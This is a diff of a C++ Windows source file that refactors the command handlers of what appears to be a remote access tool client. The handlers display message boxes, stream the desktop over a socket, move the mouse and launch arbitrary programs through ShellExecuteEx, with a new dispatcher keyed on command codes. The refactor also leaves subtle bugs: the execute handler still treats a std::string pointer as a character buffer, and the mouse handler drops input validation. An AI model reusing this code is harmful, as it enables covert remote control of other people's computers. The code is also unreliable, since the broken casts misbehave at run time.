@@ -1,16 +1,32 @@
 #include "..\pch.h"
 
-#include "Commands.h"
+#include "Commands.hpp"
 // #include "..\Network\UDPConnection.hpp"
 #include "ScreenCapturer.hpp"
 #include "..\Debugger.h"
 
-VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result)
+std::string ExecuteCommand(INT code, std::string &args)
 {
-	if (!MessageBoxEx(NULL, reinterpret_cast<LPCWSTR>(args), TEXTH("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
-		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+	$I(TEXT("cmd:'%d', args:'%s'\n"), code, args.c_str());
+
+	static std::string result(RESULT_LENGTH, { }); 
+	for (size_t i = 0; i < NUMBER_OF_COMMANDS; ++i)
+		if (MAP_COMMANDS[i].pair.code == code)
+		{
+			MAP_COMMANDS[i].task(&args, result);
+
+			return result;
+		}
+
+	return UNDEFINEDA;
+}
+
+VOID _on_task_MESSAGEBOX(CONST PVOID args, std::string &result)
+{
+	if (!MessageBoxEx(NULL, ((std::string*)args)->c_str(), TEXTH("ERROR"), MB_ICONERROR, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL)))
+		result = TASK_FAILUREA;
 	else
-		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+		result = TASK_SUCCESSA;
 }
 
 VOID SendDesktopScreen(LPVOID socket)
@@ -25,7 +41,7 @@ VOID SendDesktopScreen(LPVOID socket)
 	}
 }
 
-VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result)
+VOID _on_task_VIEWDESKTOP(CONST PVOID args, std::string &result)
 {
 	static HANDLE hThread = NULL;
 	static SOCKET socket  = INVALID_SOCKET;
@@ -38,26 +54,26 @@ VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result)
 			socket = INVALID_SOCKET; // InitUDPClient();
 			if (socket == INVALID_SOCKET)
 			{
-				_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+				result = TASK_FAILUREA;
 
 				return;
 			}
 
-			hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&SendDesktopScreen, &socket, 0, NULL);
+			hThread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(&SendDesktopScreen), &socket, 0, NULL);
 			if(!hThread)
-				_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+				result = TASK_FAILUREA;
 			else
-				_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+				result = TASK_SUCCESSA;
 		}
 		else
-			_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+			result = TASK_SUCCESSA;
 	}
 	else
 	{
 		if(!CloseHandle(hThread))
-			_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+			result = TASK_FAILUREA;
 		else
-			_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+			result = TASK_SUCCESSA;
 
 		if (closesocket(socket) != 0)
 			PrintError(TEXTH("closesocket"), WSAGetLastError());
@@ -66,27 +82,25 @@ VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result)
 	}
 }
 
-VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result)
+VOID _on_task_MOUSECTRL(CONST PVOID args, std::string &result)
 {
 	INT x = 0,
 		y = 0;
 
-	if (_stscanf_s(static_cast<PTCHAR>(args), TEXT("%d %d"), &x, &y) != 2)
+	std::stringstream sstr(*reinterpret_cast<std::string*>(args));
+	sstr >> x >> y;
+
+	if (!SetCursorPos(x, y))
 	{
-		$error _tprintf(TEXT("Failed to get mouse coords"));
+		PrintError(TEXTH("SetCursorPos"), GetLastError());
 
-		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
-
-		return;
+		result = TASK_FAILUREA;
 	}
-
-	if(!SetCursorPos(x, y))
-		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
 	else
-		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+		result = TASK_SUCCESSA;
 }
 
-VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result)
+VOID _on_task_EXECUTECMD(CONST PVOID args, std::string &result)
 {
 	SHELLEXECUTEINFO shell = { sizeof(SHELLEXECUTEINFO) };
 	shell.fMask            = SEE_MASK_DEFAULT;
@@ -95,9 +109,9 @@ VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result)
 	shell.lpParameters     = static_cast<PTCHAR>(args);
 	shell.nShow            = SW_SHOW;
 	if (!ShellExecuteEx(&shell))
-		_tcscpy_s(result, RESULT_LENGTH, TASK_FAILUREP);
+		result = TASK_FAILUREA;
 	else
-		_tcscpy_s(result, RESULT_LENGTH, TASK_SUCCESSP);
+		result = TASK_SUCCESSA;
 }
 
 INT cmd2code(CONST PTCHAR cmd)
